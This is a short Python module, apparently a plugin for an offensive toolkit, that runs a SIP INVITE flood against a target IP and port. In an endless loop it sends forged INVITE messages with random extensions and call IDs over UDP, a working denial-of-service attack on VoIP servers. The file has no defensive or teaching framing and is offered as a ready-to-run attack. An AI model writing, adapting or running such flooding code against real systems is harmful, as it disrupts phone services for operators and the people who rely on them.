import socket
import random

REQUIRED_OPTIONS = {"IP": "", "PORT": "standar port 5060"}


def execute(options):
    ip = options.get("IP")
    port = int(options.get("PORT"))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[*] Starting SIP Invite Flood on {ip}:{port}")
    count = 0
    try:
        while True:
            fake_ext = random.randint(100, 9999)
            payload = (
                f"INVITE sip:{fake_ext}@{ip} SIP/2.0\r\n"
                f"From: <sip:storm@{ip}>;tag={random.randint(100,999)}\r\n"
                f"To: <sip:{fake_ext}@{ip}>\r\n"
                f"Call-ID: {random.getrandbits(32)}\r\n"
                "CSeq: 1 INVITE\r\n"
                "Max-Forwards: 70\r\n\r\n"
            )
            sock.sendto(payload.encode(), (ip, port))
            count += 1
            print(f"[!] Sent {count} packets...", end="\r")

    except KeyboardInterrupt:
        print(f"[*] Total packets > {count}")
    except Exception as e:
        print(f"ERROR: {e}")
    finally:
        sock.close()
    return True
